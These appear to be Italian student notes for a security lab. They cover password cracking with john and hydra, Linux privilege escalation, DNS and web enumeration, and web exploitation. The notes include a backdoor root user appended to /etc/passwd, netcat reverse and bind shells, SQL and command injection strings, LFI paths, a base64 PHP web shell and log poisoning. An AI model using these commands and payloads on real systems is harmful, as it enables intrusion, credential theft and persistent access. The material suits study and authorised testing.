- consiglio: applica prima regole che impiegano meno tempo, poi quelle più pesanti
###### Path di wordlist utili in generale
- `rockyou.txt`
- `/usr/share/wordlists/rockyou.txt`
- `/usr/share/seclists/Discovery/Web-Content/common.txt`
- `/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`
- ricordiamo che `/etc/passwd` è fatto come:
	- `nome:passhash:uid:gid:commento:/home:/bin/bash`
	- esempio:
		- `root:x:0:0:root:/root:/bin/bash`
##### Password Cracking
###### Wordlist
- `crunch 7 10 AB`
	- genera parole di lunghezza da 7 a 10 usando i caratteri `A` e `B`
- `cewl https://www.target.xyz -w targetWL.txt`
	- genera una wordlist estraendo parole dal sito web
	- `-w` = output
	- `-d 1` = depth della ricerca
	- `-m 5` = lunghezza minima delle parole
###### Hashid
- `hashid hashcode`
	- prova a identificare il tipo di hash
- `hashid -j <file_hash>`
	- ritorna anche il formato da dare a John per quel file contenente l’hash
- For the Windows hash, the fact that it is entirely in CAPS LOCK is a strong hint toward NTLM
- `john --list=formats | grep -i hashidnome`
	- trova il nome dei formati per john

>[!info]- tabella degli hashid di `/etc/shadow`
>
>| Prefisso | Algoritmo |
>|---|---|
>| `$1$` | MD5 |
>| `$2a$` | Blowfish |
>| `$2y$` | Blowfish |
>| `$5$` | SHA-256 |
>| `$6$` | SHA-512 |
>| `$y$` | yescrypt |
###### Cracking con john
- `john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash1.txt`
	- cracking con un determinato formato e una determinata wordlist
- `john --single hashList`
	- applica regole interne di john per provare combinazioni basate su username
	- modo semplice ma poco efficace se la password è sicura
- `john --wordlist=/path/to/wordlist --rules=Myrule <hashes_file>`
	- cracka il file usando una custom rule
- `john --wordlist=/path/to/wordlist --rules=Myrule --stdout > nuova_wordlist.txt`
	- crea una nuova wordlist applicando la regola custom
- `john --min-length=3 --max-length=5 --wordlist=wordlist.txt hash.txt`
	- usa solo parole con lunghezza minima 3 e massima 5
- `john --show --format=raw-md4 hash`
	- mostra le password già crackate del file hash col formato `raw-md4`
###### Cracking di file con john
- `zip2john secret_corporate.zip > secret_corporate.zip.hash`
	- estrae l’hash da uno zip
	- poi fai john normale:
		- `john --wordlist=/usr/share/wordlists/rockyou.txt secret_corporate.zip.hash`
- `7z2john backup.7z > zipHash`
	- ritorna l’hash del file `.7z` in un formato utilizzabile da john
- piccola parentesi su come si fa unzip di un file con una certa password:
	- `7z x backup.7z -p{PASSWORD}`
###### Creare una tua wordlist
- crea un file `.conf`
- il formato di scrittura interno è:
```scss
[List.Rules:E04] 
c Az"202[0123456][!@#$%^&*]"
````
- dove rispettivamente si usa:
    - `c` = rende maiuscola la prima lettera
    - `A0` = inserisce una stringa all’inizio
    - `Az` = aggiunge qualcosa alla fine
    - `[xyz]` = prova uno dei caratteri in quella posizione
    - `sXY` = sostituisce `X` con `Y`
    - `r c r` = mette come maiuscola l’ultima lettera
    - `^` = aggiunge un carattere all’inizio della parola
    - `$` = aggiunge un carattere alla fine della parola
- per poi esportare la tua wordlist dal `.conf`:
    - `john --wordlist=seasons.txt --config=rules.conf --rules=E04 --stdout > E04_passwords.list`
###### Unshadow
- `/etc/passwd` e `/etc/shadow`
    - `unshadow passwd.txt shadow.txt > unshadowed.txt`
- poi fai john:
    - `john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt`
- esempio con file reali:
    - `unshadow /etc/passwd /etc/shadow > hashesFile`
###### Hydra
- di solito usato anche con:
    - `cewl https://www.target.xyz -w targetWL.txt`
        - genera una wordlist estraendo parole dal sito web
        - `-w` = output
        - `-d 1` = depth della ricerca
        - `-m 5` = lunghezza minima delle parole
    - `username-anarchy -i names.txt > usernames.txt`
        - genera varie combinazioni dei nomi
        - `-i` = file di input
- esempio hydra su protocollo:
    - `hydra -L userlist.txt -P passwordfile.txt 192.168.20.10 pop3`
        - bruteforce di combinazioni username-password su un IP con protocollo `pop3`
    - `hydra -t 4 -l EdoMan000 -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp`
        - bruteforce su `ftp`
        - `-t 4` = crea 4 thread paralleli
        - `-vV` = very verbose
        - `-l` = singolo username
        - `-L` = lista username
        - `-p` = singola password
        - `-P` = lista password
- esempio di hydra con post form, fai lo snippet e sostituisci i vari nomi:
    - `hydra -L users.txt -P E05_passwords.list vdsi.mrt.red -s 5000 http-post-form "/login:user=^USER^&pass=^PASS^:F=Login Failed" -V -c 1`
        - `^USER^` = placeholder username
        - `^PASS^` = placeholder password
        - `F=Login Failed` = stringa che indica login fallito
        - `-s 5000` = porta
        - `-V` = mostra ogni tentativo
        - `-c 1` = usa una connessione alla volta
- esempio con get senza form:
    - `hydra -L users.txt -P E05_passwords.list vdsi.mrt.red -s 5000 http-get /loginpage -V -c 1`
        - usato per HTTP Basic/Digest su una risorsa protetta
- esempio con get form:
    - `hydra -L users.txt -P E05_passwords.list vdsi.mrt.red -s 5000 http-get-form "/login?user=^USER^&pass=^PASS^:F=Login Failed" -V -c 1`
        - usato quando username e password sono parametri GET nell’URL


- consiglio: applica prima regole che impiegano meno tempo ma ora più tempo
###### Path di wordlist utili in generale
- rockyou.txt
- `/usr/share/seclists/Discovery/Web-Content/common.txt`
- `/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`
- ricordiamo che passwd è fatto come 
	- `nome:passhash:0:0:/root:/bin/bash`
##### Password Cracking
###### Hashid
`hashid hashcode`
For the Windows hash, the fact that it is entirely in CAPS LOCK is a strong hint toward NTLM
`john --list=formats | grep -i hashidnome`
- trovare il nome dei formati per john

>[!info]- tabella degli hashid di passwd
> 
> |Prefisso|Algoritmo|
> |---|---|
> |`$1$`|MD5|
> |`$2a$`|Blowfish|
> |`$2y$`|Blowfish|
> |`$5$`|SHA-256|
> |`$6$`|SHA-512|
> |`$y$`|yescrypt|

###### Cracking con john
`john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash1.txt`
`john -show -format=raw-md4` 
- hash mostra le password già crackate del file hash col formato raw-md4
###### Cracking di file con john
`zip2john secret_corporate.zip > secret_corporate.zip.hash`
- poi fai john normale
	- `john --wordlist=/usr/share/wordlists/rockyou.txt secret_corporate.zip.hash`
- piccola parentesi su come si fa unzip di un file con una certa password
	- `7z x backup.7z -p{PASSWORD}`
###### Creare una tua wordlist
- crea un file `.conf`
 il formato di scrittura interno è
```scss
[List.Rules:E04] 
c Az"202[0123456][!@#$%^&*]"
```
- dove rispettivamente si usa:
- `c` = rende maiuscola la prima lettera
- `A0` = inserisce stringa all’inizio
- `Az` = aggiunge qualcosa alla fine
- `[xyz]` = prova uno dei caratteri in quella posizione
- `@sXY` = sostituisce X con Y
- `r c r`= metti come maiuscola l'ultima
- `^` = aggiunge un carattere all’inizio della parola
- per poi esportare la tua wordlist il `.conf`
	- `john --wordlist=seasons.txt --config=rules.conf --rules=E04 --stdout > E04_passwords.list`
###### Unshadow
- etc/passwd e etc/shadow
	- `unshadow passwd.txt shadow.txt > unshadowed.txt`
- `john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt`
###### hydra
di solito usato con anche 
- `cewl [https://www.target.xyz](https://www.target.xyz) -w targetWL.txt` genera una wordlist estraendo parole dal sito web
	- w output
	- m 5 lunghezza minima delle parole
- `username-anarchy -i names.txt > usernames.txt`
	- genera varie combinazioni dei nomi
	- `-i`
- esempio di hydra con post form(fai lo snippet e sostituisci i vari nomi
	- `hydra -L users.txt -P E05_passwords.list vdsi.mrt.red -s 5000 http-post-form "/login:user=^USER^&pass=^PASS^:F=Login Failed" -V -c 1`
- esempio con get:
	- `hydra -L users.txt -P E05_passwords.list vdsi.mrt.red -s 5000 http-get /loginpage -V -c 1`
##### Privesc
- Privesc si divide in 2 parti principali 
	- enumeration 
		- `whoami`
			- mostra l’utente corrente
		- `id`
			- mostra `uid`, `gid` e gruppi dell’utente
		- `groups`
			- mostra i gruppi dell’utente
		- `uname -a`
			- mostra info su kernel e sistema
		- `history`
			- mostra i comandi eseguiti in precedenza
		- nella cartella home fai `ls -la` o `ls -lah`
			- mostra file nascosti e permessi
		- `printenv`
			- mostra le variabili d’ambiente
		- `cat /etc/passwd`
			- mostra gli utenti presenti nel sistema
		- `cat /etc/hosts`
			- mostra host locali configurati
		- `cat /var/log/auth.log`
			- mostra tentativi di login/autenticazione, se leggibile
		- `ls -la /var/spool/cron/crontabs`
			- controlla eventuali cronjob degli utenti
		- `find / -perm -u=s -type f 2>/dev/null`
			- cerca tutti i file con bit SUID attivo nel sistema
		- `find / -type f \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null`
			- cerca file con SUID o SGID attivo
		- `find / -group nomegruppo 2>/dev/null`
			- cerca file appartenenti a un gruppo specifico
		- `getcap -r / 2>/dev/null`
			- cerca programmi con capabilities Linux
		- `sudo -l`
			- mostra quali comandi puoi eseguire con sudo
		- `file <file_name>`
			- ritorna il tipo di file
		- `strings nomefile`
			- ritorna stringhe leggibili da un file/binario
		- `crontab -l`
			- ti dà la lista dei cronjob dell’utente corrente
			- uso `pspy64` per vedere processi e cronjob senza root
		- `top`
			- mostra i processi attivi tipo task manager
		- `ps aux`
			- mostra i processi in esecuzione
		- `ps aux | grep nome`
			- cerca un processo specifico
		- `ssh user@<ip oppure hostname>`
			- login sulla macchina come user usando la password
		- `ssh -i <chiave_ssh> user@<ip oppure hostname>`
			- login usando una chiave SSH
		- `ssh -L <porta_locale>:127.0.0.1:<porta_remota> user@<ip>`
			- port forwarding locale
			- esempio: `ssh -L 9090:127.0.0.1:9090 student@10.10.10.10`
		- un file ha le sue proprietà
			- in ordine si tratta di proprietario, gruppo, others
			- `r` = read, `w` = write, `x` = execute
			- SUID: il file viene eseguito con l’effective `uid` del proprietario
			- SGID: simile al SUID ma riguarda il gruppo
	- Privesc vera e propria
		- switch user `su nomeutente`
			- cambia utente, serve la password di quell’utente
		- `su - nomeutente`
			- cambia utente caricando anche il suo ambiente
		- `su -p utente -c "nomecomando"`
			- esegue un comando come quell’utente preservando alcune variabili d’ambiente
			- `-p` non forza l’uid, preserva l’ambiente
		- `sudo comando`
			- esegue un comando come root, se permesso
		- `sudo -u utente comando`
			- esegue un comando come un altro utente, se permesso
		- usare [GTFObins](https://gtfobins.github.io/) per trovare una vulnerabilità
			- controllare soprattutto `sudo`, SUID, capabilities, shell escape, file read/write
		- `chmod +x file.txt`
			- aggiunge permesso di esecuzione
		- `chmod +w file.txt`
			- aggiunge permesso di scrittura
		- `chmod +r file.txt`
			- aggiunge permesso di lettura
		- `chmod 777 file.txt`
			- dà lettura, scrittura ed esecuzione a tutti
###### Aggiungere un utente
- `openssl passwd -6 password123`
	- crea l’hash della password
- `echo 'backdoor:$6$salt$hashedpassword:0:0:root:/root:/bin/bash' >> /etc/passwd`
	- aggiunge l’utente a `/etc/passwd`
	- UID `0` = root
	- funziona solo se hai permessi di scrittura su `/etc/passwd`

##### Network
- parte 1: dns nmap e roba
- `dig @192.168.14.98 vdsilab.local txt`
    - interroga il DNS `192.168.14.98` cercando record `TXT` del dominio
    - i record TXT spesso contengono note, token, flag o info utili
- `dig @192.168.14.95 vdsisecurity.lab axfr`
    - prova una **zone transfer DNS**
    - se funziona, scarica tutti i record del dominio, inclusi sottodomini
- `dnsenum vdsisecurity.lab --dnsserver 192.168.14.95 -f subdomains-top1million-5000.txt`
    - enumera DNS e sottodomini
    - usa il DNS indicato e una wordlist per bruteforzare sottodomini
- `nmap -sC -sV -sS 192.168.14.117`
    - `-sC` = script base di nmap
    - `-sV` = rileva versioni dei servizi
    - `-sS` = SYN scan, scansione TCP “semi-aperta”
- `curl -H "Host: sup3r.s3cr3t-b4ck3nd.vdsizone.transfer" http://192.168.14.96`
    - fa una richiesta HTTP all’IP usando un **Host header** specifico
    - utile quando più siti/virtual host stanno sullo stesso IP
- `nmap -p 62260-65535 192.168.14.97`
    - scansiona solo le porte da `62260` a `65535`
- `nmap -P0 <ip>`
    - salta il ping iniziale
    - utile se il target blocca ICMP/ping ma ha porte aperte
- `curl -v -X TRACE http://192.168.14.99:8080`
    - prova il metodo HTTP `TRACE`
    - `-v` mostra dettagli della richiesta/risposta
    - se TRACE è attivo può essere una configurazione insicura
- `nc 192.168.14.115 9007`
    - si connette alla porta `9007` con netcat
    - utile per banner grabbing, servizi custom o challenge testuali
- parte 2: shell [https://revshells.com](https://revshells.com) 
	- reverse
		- mi metto in ascolto su una porta
		- il server si connette a me
		- uso RCE per far partire la connessione dal target
		- **comandi (netcat)**
		     - lato **attaccante (listener)**:
	          `nc -lvp 4444`
		    - lato **target**:
	         `nc <IP_attaccante> 4444 -e /bin/bash`
	- bind
	    - lato **server (target)**:
	        `nc -lvp 4444 -e /bin/bash`
	        - `-l` → listen
	        - `-v` → verbose
	        - `-p` → porta
	        - `-e` → esegue la shell
	    - lato **attaccante (client)**:
	        `nc <IP_target> 4444
		- netstat -tulpn
- local port forwarding e remote port forwarding
	- `ssh user@192.168.0.45 -L 8080:192.168.0.35:80`  
		- mi collego alla macchina compromessa `192.168.0.45`  
		- apro la porta `8080` sul mio PC  
		- quando accedo a `localhost:8080`  
		- sto in realtà comunicando con `192.168.0.35:80`  
	- `ssh user@192.168.0.45 -R 8080:localhost:4444`  
		- mi collego alla macchina `192.168.0.45`  
		- apro la porta `8080` sulla macchina remota  
		- quando qualcuno si connette a `192.168.0.45:8080`  
		- il traffico viene inoltrato al mio PC su `localhost:4444`

##### Web Enumeration
cartelle utilissime per trovare cose nascoste o altro
- `/robots.txt`
- `/sitemap.xml`
- trovare i virtual host che nascondono gli host che hanno 4829 linee
	- `wfuzz -w ./subdomains-top1million-5000.txt -u http://192.168.14.132 -H "HOST: FUZZ.cloud.vdsi" --hh 4829`
		- `gobuster vhost -u http://vdsi-services.xyz/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`
- trovare i web content delle cartelle
	- `gobuster dir -u http://cloud.vdsi --proxy http://127.0.0.1:8080 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --exclude-length 4829`
	- `gobuster dir -u http://admin.cloud.vdsi  -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --exclude-length 0 -x php`
		- questo include anche `.php` come estensione dei file
	- `feroxbuster -u http://vdsi-services.xyz/d3v-VDS1 -w /usr/share/seclists/Discovery/Web-Content/common.txt`
cose extra per dumping di un git
- `git dumper python `
- `git_dumper.py http://vdsi-services.xyz/d3v-VDS1/.git/ ./sberg2`

##### Web Exploitation
di solito utente che esegue il processo server si chiama (es. `www-data`)
- se hai una pagina di login è possibile che ci sia una query sotto in sql
	- prova a fare `' OR '1'='1`
- se hai un comando che ti fa eseguire tipo ping a indirizzi da te inseriti prova a fare `";"id"` per far eseguire id 
- se ho una file inclusion con parametri posso trovare anche cose nella dir normale
- `?page=file:///etc/passwd`
	- `../../../../etc/passwd`
	- `..%2F..%2F..%2F..%2Fetc%2Fpasswd`
- sfruttare php wrapper
	- `php://filter/read=convert.base64-encode/resource=config`
		- In questo caso PHP legge la risorsa `config`, ma prima di restituirla la converte in **Base64**
	- `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=`
		- serve per **iniettare direttamente del contenuto**, per esempio codice PHP codificato in Base64, senza dover caricare un file sul server
- posso usare vari php wrapper
	- creiamo un file php da revshell
	- lo uplodiamo nella macchina
	- lo eseguiamo da include nel parametro page
	- la rev shell magari funziona se non funziona prova un altro comando
	- la più stabile credo sia la `proc_open`
	- gli altri eseguono il comando nel web server e il processo shell muore subito
	- così apre il nuovo processo
- Se non hai file upload
	- Se non puoi caricare file, puoi cercare altri modi per “scrivere” qualcosa sul server.
	- Un caso tipico sono i log:
	    - `/var/log/apache2/access.log`
	    - `/var/log/nginx/access.log`
	    - `/var/log/<nome_server>/access.log`
	- L’`access.log` salva le richieste HTTP ricevute.
	- Se c’è una **LFI**, puoi provare a leggere/includere il log.
	- In alcuni casi puoi mettere codice o payload dentro User-Agent, URL o altri header, farlo finire nel log e poi includerlo.
Esempio idea:
`User-Agent: <?php system($_GET['cmd']); ?>`
Poi, se il log viene incluso da una LFI, potresti eseguire comandi tipo:
`?page=/var/log/apache2/access.log&cmd=id`
###### MIME / Content-Type
- Il MIME type indica il tipo del file inviato.
- Esempi:
    - `image/png`
    - `image/jpeg`
    - `text/plain`
    - `application/x-php`
- Alcuni upload controllano solo il `Content-Type`.
- Con Burp puoi intercettare la richiesta e modificarlo.
`Content-Type: image/png`
anche se il file in realtà è PHP.
- Serve per provare a bypassare controlli deboli sull’upload.
- Però un controllo serio verifica anche estensione, contenuto reale del file e configurazione del server.
